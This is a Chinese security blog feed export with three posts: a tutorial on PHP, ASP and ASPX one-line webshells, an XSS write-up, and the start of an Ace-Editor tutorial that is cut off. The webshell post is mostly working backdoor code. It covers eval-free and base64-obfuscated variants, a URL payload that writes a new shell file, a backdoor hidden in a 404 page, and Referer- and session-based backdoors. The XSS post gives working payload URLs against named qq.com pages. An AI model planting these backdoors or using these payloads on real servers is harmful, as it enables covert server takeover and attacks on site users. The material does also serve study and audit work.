<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--asp一句话木马：--&gt;</span></div><div class="line"><span class="vbscript">&lt;%<span class="keyword">execute</span>(<span class="built_in">request</span>(<span class="string">"value"</span>))%&gt;</span></div><div class="line"><span class="comment">&lt;!--php一句话木马：--&gt;</span></div><div class="line"><span class="php"><span class="preprocessor">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[value]);<span class="preprocessor">?&gt;</span></span></div><div class="line"><span class="comment">&lt;!--aspx一句话木马：--&gt;</span></div><div class="line"><span class="vbscript">&lt;%@ Page Language=<span class="string">"Jscript"</span>%&gt;</span></div><div class="line"><span class="vbscript">&lt;%<span class="built_in">eval</span>(<span class="built_in">Request</span>.Item[<span class="string">"value"</span>])%&gt;</span></div></pre></td></tr></table></figure>

<h2 id="0X02_变形">0X02 变形</h2>
<p>黑帽子的目的，就是想尽办法给目标网站插入这么一段会被储存起来的话，可以是一个单独的.asp 或者是.php,.aspx 文件，或者是隐藏在某些网页下，其中的value 就是客户端要发送的内容。然后通过客户端与服务器建立连接，发送控制脚本。</p>
<p>而上传文件，则涉及到任意文件上传的漏洞挖掘了，这也是黑帽无所不用其极的展现猥琐技术的地方，在此不表。这里，我们先以PHP 为例，去继续深挖那些挂马的技巧。</p>
<p>在上边的例子中，php 文件，很明显的 eval 可以成为一个静态特征码，webshell扫描工具可以以此为关键词，扫描到这种木马加以屏蔽。于是增加一点技巧的话，我们可以不出现eval:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">@<span class="variable">$_GET</span>[a](<span class="variable">$_POST</span>[xxx]);</div></pre></td></tr></table></figure>

<p>一样的，传给a值为 @base64_decode(base64编码过后的eval)，这仍然就是最简单的一句话。<br>甚至，我们还可以连POST 都不出现。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span> <span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b]);<span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>上边这个例子仅仅使用了GET 函数来构造木马，利用方法是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?a=assert&b=${fputs%<span class="number">28</span>fopen%<span class="number">28</span>base64_decode%<span class="number">28</span>Yy5waHA%<span class="number">29</span>,w%<span class="number">29</span>,base64_decode%<span class="number">28</span>PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%<span class="number">29</span>%<span class="number">29</span>};</div></pre></td></tr></table></figure>

<p>因为我们使用的是PHP 的GET 函数，所以我们的利用方法构造在URL 里，其中的括号部分URL 编码，为了清晰我们把URL 编码的内容转换回来：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?a=assert&b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4))};</div></pre></td></tr></table></figure>


<p>我们看到，这里有两个base64 的解码，很明显是利用了base64编码来绕过扫描，我们进行解码看看：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?a=assert&b=${fputs(fopen(c.php,w),<span class="preprocessor">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[c]); <span class="preprocessor">?&gt;</span><span class="number">1</span>)};</div></pre></td></tr></table></figure>

<p>执行后当前目录生成c.php 一句话木马，木马内容就是最常见的一句话，这已经算是一个非常隐蔽的木马了，而在PHP 后门的变形之路上，远远不止这些，你甚至可以自己定义一个加密解密的函数，或者是利用xor, 字符串翻转，压缩，截断重组等等方法来绕过。</p>
<h2 id="0X03_更高级的变形和隐藏">0X03 更高级的变形和隐藏</h2>
<p>下面我们再看一些强悍的后门：</p>
<p><strong>利用404页面隐藏木马</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="doctype">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span><span class="tag">&lt;<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="title">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span><span class="tag">&lt;<span class="title">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="title">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">p</span>&gt;</span>The requested URL was not found on this server.<span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div><div class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span></div><div class="line">@preg_replace(<span class="string">"/[pageerror]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'error'</span>],<span class="string">"saft"</span>);</div><div class="line">header(<span class="string">'HTTP/1.1 404 Not Found'</span>);</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>

<p>一般404页面放好后，很少有人会记得定期对404页面进行检查和修改，但如果在404页面里，如果挂上了一句话后门，一方面不会被发现，另一方面，黑帽子很容易能定位到并连接上服务器。</p>
<p> <strong>无特征隐藏PHP后门</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="variable">$_POST</span>[<span class="string">'code'</span>] && <span class="variable">$_SESSION</span>[<span class="string">'theCode'</span>] = trim(<span class="variable">$_POST</span>[<span class="string">'code'</span>]);</div><div class="line"><span class="variable">$_SESSION</span>[<span class="string">'theCode'</span>]&&preg_replace(<span class="string">'\'a\'eis'</span>,<span class="string">'e'</span>.<span class="string">'v'</span>.<span class="string">'a'</span>.<span class="string">'l'</span>.<span class="string">'(base64_decode($_SESSION[\'theCode\']))'</span>,<span class="string">'a'</span>);</div></pre></td></tr></table></figure>

<p>这句话也隐藏了eval 特征码，利用<strong>$_SEESION</strong> 变量来绕过，将<strong>$_POST[‘code’]</strong>赋值给$_SESSION[‘theCode’]，然后eval 执行SESSION 的内容。</p>
<p>还有一些则是利用HTTP 请求中的hTTP_REFERER 来运行经过base64编码的代码，达到后门的效果，使用两个文件：<br>文件1：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="comment">//1.php</span></div><div class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</div><div class="line">parse_str(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>], <span class="variable">$a</span>);</div><div class="line"><span class="keyword">if</span>(reset(<span class="variable">$a</span>) == <span class="string">'10'</span> && count(<span class="variable">$a</span>) == <span class="number">9</span>) {</div><div class="line">   <span class="keyword">eval</span>(base64_decode(str_replace(<span class="string">" "</span>, <span class="string">"+"</span>, implode(array_slice(<span class="variable">$a</span>, <span class="number">6</span>)))));</div><div class="line">}</div></pre></td></tr></table></figure>

<p>HTTP_REFERER 是header 的一部分，告诉服务器是从哪个页面跳转链接过来的，这里边利用了这一字段，来做后门，另一个页面如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line"><span class="comment">//2.php</span></div><div class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="comment">//要执行的代码</span></div><div class="line"><span class="variable">$code</span> = <span class="string">&lt;&lt;&lt;CODE</span></div><div class="line">phpinfo();</div><div class="line">CODE;</div><div class="line"><span class="comment">//进行base64编码</span></div><div class="line"><span class="variable">$code</span> = base64_encode(<span class="variable">$code</span>);</div><div class="line"><span class="comment">//构造referer字符串</span></div><div class="line"><span class="variable">$referer</span> = <span class="string">"a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i="</span>;</div><div class="line"><span class="comment">//后门url</span></div><div class="line"><span class="variable">$url</span> = <span class="string">'http://localhost/test1/1.php'</span>;</div><div class="line"><span class="variable">$ch</span> = curl_init();</div><div class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</div><div class="line">    CURLOPT_URL =&gt; <span class="variable">$url</span>,</div><div class="line">    CURLOPT_HEADER =&gt; <span class="keyword">FALSE</span>,</div><div class="line">    CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">TRUE</span>,</div><div class="line">    CURLOPT_REFERER =&gt; <span class="variable">$referer</span></div><div class="line">);</div><div class="line">curl_setopt_array(<span class="variable">$ch</span>, <span class="variable">$options</span>);</div><div class="line"><span class="keyword">echo</span> curl_exec(<span class="variable">$ch</span>);</div></pre></td></tr></table></figure>

<p>我们访问文件2，他会构造一个会话，进到后门url 1.php那里，然后在HTTP_REFERER 的内容也会传递给1.php，通过1.php 执行。一般来说，waf会对 referer字段宽松一些，也就造成了一个绕过。</p>
<p><strong>来一些常见的后门</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、</div><div class="line"><span class="variable">$hh</span> = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;</div><div class="line"><span class="variable">$hh</span>(<span class="string">"/[discuz]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"Access"</span>);</div><div class="line"><span class="comment">//菜刀一句话</span></div><div class="line"><span class="number">2</span>、</div><div class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">'xbid'</span>];</div><div class="line"><span class="keyword">include</span> (<span class="variable">$filename</span>);</div><div class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行</span></div><div class="line"><span class="number">3</span>、</div><div class="line"><span class="variable">$reg</span>=<span class="string">"c"</span>.<span class="string">"o"</span>.<span class="string">"p"</span>.<span class="string">"y"</span>;</div><div class="line"><span class="variable">$reg</span>(<span class="variable">$_FILES</span>[MyFile][tmp_name],<span class="variable">$_FILES</span>[MyFile][name]);</div><div class="line"><span class="comment">//重命名任何文件</span></div><div class="line"><span class="number">4</span>、</div><div class="line"><span class="variable">$gzid</span> = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;</div><div class="line"><span class="variable">$gzid</span>(<span class="string">"/[discuz]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"Access"</span>);</div><div class="line"><span class="comment">//菜刀一句话</span></div><div class="line"><span class="number">5</span>、<span class="keyword">include</span> (<span class="variable">$uid</span>);</div><div class="line"><span class="comment">//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif</span></div><div class="line"><span class="comment">//gif插一句话</span></div><div class="line"><span class="number">6</span>、典型一句话</div><div class="line">程序后门代码</div><div class="line"><span class="preprocessor">&lt;?php</span> eval_r(<span class="variable">$_POST</span>[sb])<span class="preprocessor">?&gt;</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?php</span> @eval_r(<span class="variable">$_POST</span>[sb])<span class="preprocessor">?&gt;</span></div><div class="line"><span class="comment">//容错代码</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?php</span> assert(<span class="variable">$_POST</span>[sb]);<span class="preprocessor">?&gt;</span></div><div class="line"><span class="comment">//使用lanker一句话客户端的专家模式执行相关的php语句</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?</span><span class="variable">$_POST</span>[<span class="string">'sa'</span>](<span class="variable">$_POST</span>[<span class="string">'sb'</span>]);<span class="preprocessor">?&gt;</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?</span><span class="variable">$_POST</span>[<span class="string">'sa'</span>](<span class="variable">$_POST</span>[<span class="string">'sb'</span>],<span class="variable">$_POST</span>[<span class="string">'sc'</span>])<span class="preprocessor">?&gt;</span></div><div class="line">程序代码</div><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">@preg_replace(<span class="string">"/[email]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"error"</span>);</div><div class="line"><span class="preprocessor">?&gt;</span></div><div class="line"><span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入</span></div><div class="line">程序代码</div><div class="line">&lt;O&gt;h=@eval_r(<span class="variable">$_POST1</span>);&lt;/O&gt;</div><div class="line">程序代码</div><div class="line">&lt;script language=<span class="string">"php"</span>&gt;@eval_r(<span class="variable">$_POST</span>[sb])&lt;/script&gt;</div><div class="line"><span class="comment">//绕过&lt;?限制的一句话</span></div></pre></td></tr></table></figure>

<h2 id="0X04_攻防之机">0X04 攻防之机</h2>
<p>对于攻方，利用各种各样的绕过姿势，都是试图让扫描工具无效。对于守方，分析各种各样的函数，寻找有效的特征码来防止后门。而傲然物外的大牛黑客们，更可以深入web框架内核，挖掘出代码缺陷，构造出复杂的后门利用。</p>
<p>而作为安全审计人员，只要心细，对那些通过GET，POST 获取的超全局变量，进行细致的追踪，就可以有效的寻找到代码之间的问题，构造合适的过滤器，就可以预防绝大多数后门。</p>
<p>一个有效而快速的自动化检测方法，是通过语义分析的方式，对GET POST 获取的值进行污染点追踪，以确保这些用户可控的值，不会未经过滤就得到了执行，或是进入数据库中，而语义分析方法，后边会再进行进一步学习。</p>
<p>当然，这都不是绝对安全的，正如我们前边举得例子，正是利用了SESSION 和 SERVER 这些变量来构造后门，而在PHP 语言中，超全局变量还有这么多：</p>
<ul>
<li>$GLOBALS</li>
<li>$_SERVER</li>
<li>$_REQUEST</li>
<li>$_POST</li>
<li>$_GET</li>
<li>$_FILES</li>
<li>$_ENV</li>
<li>$_COOKIE</li>
<li>$_SESSION</li>
</ul>
<p>所以针对这些变量的语义分析，也就变得更加复杂，漏洞将变得不可避免。同时，诸如include,preg_replace 这些PHP 中危险的变量，也是需要分外注意的。</p>
<p>所以，一个优秀的程序，是对代码有足够敏感性的，同时对整个架构下的层次权限分配要足够清晰和严格，过滤规则的学习永无止境，安全审查的更新也是永无止境，那些当前看起来人畜无害的部分，随时可能会直插心脏而沦陷。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="给我一句话的时间_—_那些一句话后门">给我一句话的时间 — 那些一句话后门</h1>
<h2 id="0X01_简单原理">0X01 简单原理</h2>
<p>在我们进行渗透测试的最后阶段，入侵到内网里，无论是想要浏览网站结构，还是抓取数据库，或者是挂个木马什么]]>
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[(level 9)深入源码，遇见eval和iframe -- XSS升级之路]]></title>
    <link href="http://yoursite.com/2016/05/24/-level-9-%E6%B7%B1%E5%85%A5%E6%BA%90%E7%A0%81%EF%BC%8C%E9%81%87%E8%A7%81eval%E5%92%8Ciframe-XSS%E5%8D%87%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2016/05/24/-level-9-深入源码，遇见eval和iframe-XSS升级之路/</id>
    <published>2016-05-24T13:15:16.000Z</published>
    <updated>2016-05-24T13:16:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="深入源码，邂逅eval和iframe">深入源码，邂逅eval和iframe</h1>
<p>前边的分析过程，看起来还是比较浅，不论是直接在源码中出现的，还是在elements 中出现的，他们都是通过JavaScript 的document.write 或者是 innerHTML 输出到网页去了，所以还是可以轻松的在开发者工具那里看到输出的位置。但是，如果一部分输出，最终没有流向innerHTML 或者是 document.write，就需要安心下来慢慢挖掘了。</p>
<p>腾讯的栗子：<br><a href="http://kf.qq.com/search_app.shtml?key=aaaaa" target="_blank" rel="external">http://kf.qq.com/search_app.shtml?key=aaaaa</a></p>
<p>跑去源码和开发者工具里搜索一通，都没有搜索到，下面，我们换个思路，进入console 中，看能否发现一些。我们按照往常，在URL 的参数里，构造一些特殊字符，单引号，双引号，尖括号，斜杠，一般来说，双引号单引号都会最早被过滤，所以一般斜杠的几率还大一些。我们构建之后，查看结果返回一个错误的信息：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640909121568.jpg" alt=""><br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640909234736.jpg" alt=""></p>
<p>右边能点开帮助文档，能看到源文件，那我们进源文件好好看看到底哪里出错了，有没有机会绕过。我们定位到代码的位置，上下文大约如此：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> getarg = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></div><div class="line"></div><div class="line">{</div><div class="line">	<span class="keyword">var</span> url = <span class="built_in">window</span>.location.href;</div><div class="line">	<span class="keyword">var</span> allargs = url.split(<span class="string">"?"</span>)[<span class="number">1</span>];</div><div class="line">	<span class="keyword">if</span> (allargs!=<span class="literal">null</span> && allargs.indexOf(<span class="string">"="</span>)&gt;<span class="number">0</span>)</div><div class="line">	{</div><div class="line">		<span class="keyword">var</span> args = allargs.split(<span class="string">"&"</span>);</div><div class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;args.length; i++)</div><div class="line">		{</div><div class="line">			<span class="keyword">var</span> arg = args[i].split(<span class="string">"="</span>);</div><div class="line">			<span class="built_in">eval</span>(<span class="string">'this.'</span>+arg[<span class="number">0</span>]+<span class="string">'="'</span>+arg[<span class="number">1</span>]+<span class="string">'";'</span>);</div><div class="line">		}</div><div class="line">	}</div><div class="line">};</div></pre></td></tr></table></figure>

<p>这就是最简单的从URL 中获取参数的代码，url 是原始的url,allargs 是问号之后的参数部分，然后通过&amp; 分割的开来，然后对URL 中每一个参数键值对，用一个eval 来执行记录操作，也就是执行了eval(‘this.key’=”aaaa”;’)，eval(‘this.’+arg[0]+’=”‘+arg[1]+’”;’);两个参数分别对应了等号左右的键和值，虽然我们没有在页面里看到输出，但是它实际上还是输出了。</p>
<p>那么，我们不仅可以对值进行替换，还可以对键进行替换尝试，我们先替换一下arg[0] 试试：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.key=<span class="string">"aaaa"</span>;</div><div class="line"><span class="keyword">this</span>.key;alert(<span class="number">1</span>);<span class="comment">//="aaaa";</span></div></pre></td></tr></table></figure>

<p>变成上式那样的，就可以弹窗了，双斜杠形成注释，截掉了后边的内容。测试一下这个URL：<br><a href="http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa" target="_blank" rel="external">http://kf.qq.com/search_app.shtml?key;alert(1);//=aaaa</a></p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640923929508.jpg" alt=""></p>
<p>弹弹弹，那么后边的值部分可以不可以呢。</p>
<p>按照惯常思路，使用双引号闭合，然后加入利用函数：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.key=<span class="string">"aaaa"</span>;</div><div class="line"><span class="keyword">this</span>.key=<span class="string">"aaaa"</span>;alert(<span class="number">1</span>);<span class="comment">//";</span></div></pre></td></tr></table></figure>

<p>构造出来的URL：<br><a href="http://kf.qq.com/search_app.shtml?key=aaa&quot;;alert(1);//" target="_blank" rel="external">http://kf.qq.com/search_app.shtml?key=aaa&quot;;alert(1);//</a></p>
<p>但是，对于chrome等非IE 浏览器，实际上，对于URL 出现的双引号，会将其进行URL 编码，在HTML 解析的时候，无法完成正常的语法结构，也就失效了，不过上述代码在IE下是有效的。</p>
<p>下面我们再发现输出在iframe中的，因为iframe 后边可以跟src ，有时候为了方便嵌套小框架，会从URL里读取参数，然后构造成地址，输出在iframe 的src 中，形如：&lt; iframe src=”[输出]”&gt;&lt; /iframe&gt;。</p>
<p>但是，对于src 来说，我们可以插入伪URL ，来执行JS 代码，常见的插入在前边也说过，对于iframe 可以有以下几种：</p>
<ul>
<li>&lt; iframe onload=”alert(1)”&gt;&lt; /iframe&gt;</li>
<li>js伪url: &lt; iframe src=”javascript:alert(1)”&gt;&lt; /iframe&gt;</li>
<li>IE下的vbscript执行代码： &lt; iframe src=”vbscript:msgbox(1)”&gt;&lt; /iframe&gt; </li>
<li>Chrome 下data的协议执行代码：&lt; iframe src=”data:text/html,&lt; script&gt;alert(1)&lt; /script&gt;”&gt;&lt; /iframe&gt;</li>
<li>如果尖括号被屏蔽，还可以使用HTML 实体编码：&lt; iframe src=”data:text/html,&amp;lt ;script&amp;gt ;alert(1)&amp;lt ;/script&amp;gt ;”&gt;&lt; /iframe&gt;</li>
<li>以及Chrome下srcdoc属性:&lt; iframe srcdoc=”&amp;lt ; script&amp;gt ;alert(1)&amp;lt ;/script&amp;gt ;”&gt;&lt; /iframe&gt;</li>
</ul>
<p>下面继续从乌云上的栗子开始学习：<br><a href="http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=" target="_blank" rel="external">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=aaaaaa&amp;gid=yl&amp;cid=68&amp;from=</a></p>
<p>仍然使用最简单的方式去开发者工具里找输出，看到被带到了iframe 的src 中去：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640940633944.jpg" alt=""></p>
<p>尝试用最简单的方式构造一个弹窗：<br><a href="http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&amp;gid=yl&amp;cid=68&amp;from=" target="_blank" rel="external">http://helper.qq.com/appweb/tools/tool-detail.shtml?turl=javascript:alert(1);&amp;gid=yl&amp;cid=68&amp;from=</a><br>结果失效：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-24-14640940998030.jpg" alt=""></p>
<p>看来是被过滤掉了，那么寻找到这个iframe 的处理操作，去找找问题，在js 源码里，找到了相关的处理：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">OpenFrame</span><span class="params">(url)</span> </span>{</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (url.toLowerCase().indexOf(<span class="string">'http://'</span>) != <span class="string">'-1'</span> || url.toLowerCase().indexOf(<span class="string">'https://'</span>) != <span class="string">'-1'</span> || url.toLowerCase().indexOf(<span class="string">'javascript:'</span>) != <span class="string">'-1'</span>) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">	<span class="built_in">document</span>.getElementById(<span class="string">"toolframe"</span>).src = url;</div><div class="line"></div><div class="line">}</div></pre></td></tr></table></figure>

<p>实际上，他做了最简单的过滤，仅仅是不允许JavaScript 伪URL，而url 参数，我们寻找turl 参数，源码中，并没再做更多操作：</p>
<figure class="highlight JavaScript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> tool_url = getQueryStringValue(<span class="string">"turl"</span>);</div><div class="line">...</div><div class="line">openFrame(tool_url);</div></pre></td></tr></table></figure>

<p>那么我们就可以用上边说的使用VBScript来在IE 下XSS，可以在Chrome 中用date 来构造XSS。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">IE： http://helper.qq.com/appweb/tools/tool-detail.shtml?<span class="variable">turl=</span>vbscript:msgbox(<span class="number">1</span>)'&<span class="variable">gid=</span>yl&<span class="variable">cid=</span><span class="number">68</span>&<span class="variable">from=</span></div><div class="line"></div><div class="line">Chrome: http://helper.qq.com/appweb/tools/tool-detail.shtml?<span class="variable">turl=</span>data:text/html,&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;'&<span class="variable">gid=</span>yl&<span class="variable">cid=</span><span class="number">68</span>&<span class="variable">from=</span></div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[<h1 id="深入源码，邂逅eval和iframe">深入源码，邂逅eval和iframe</h1>
<p>前边的分析过程，看起来还是比较浅，不论是直接在源码中出现的，还是在elements 中出现的，他们都是通过JavaScript 的document.write 或者是 i]]>
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Ace-Editor 上手及调用方法]]></title>
    <link href="http://yoursite.com/2016/05/24/Ace-Editor-%E4%B8%8A%E6%89%8B%E5%8F%8A%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2016/05/24/Ace-Editor-上手及调用方法/</id>
    <published>2016-05-24T09:05:34.000Z</published>
    <updated>2016-05-24T09:06:31.000Z</updated>
    <content type="html"><![CDATA[<h1 id="Ace-Editor_上手及调用方法">Ace-Editor 上手及调用方法</h1>
<p>因为最近一个项目的需要，需要一个网页端的代码显示，可编辑，高亮，显行，方便跳转等功能。试着想了想怎么写，越想越麻烦，本着不重复造轮子的想法，找到了C9 在线编辑器的base 版，也就是这个Ace-Editor, Ace-Editor 功能很强大，我配置使用了一下，能够满足各种需求了。</p>
<h1 id="上手">上手</h1>
<p>主页：<a href="https://ace.c9.io" target="_blank" rel="external">Ace-editor</a><br>Github: <a href="https://github.com/ajaxorg/ace-builds/" target="_blank" rel="external">ace-builds</a></p>
<p>clone 下builds 文件，这些已经是generated files 了，如果要进一步了解，对编辑器本身做改造，可以访问源头<a href="https://github.com/ajaxorg/ace" target="_blank" rel="external">ace</a>。</p>
<p>使用代码编辑器很简单，下载完builds files之后，在html 文件插入如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="doctype">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">html</span> <span class="attribute">lang</span>=<span class="value">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>ACE in Action<span class="tag">&lt;/<span class="title">title</span>&gt;</span></div><div 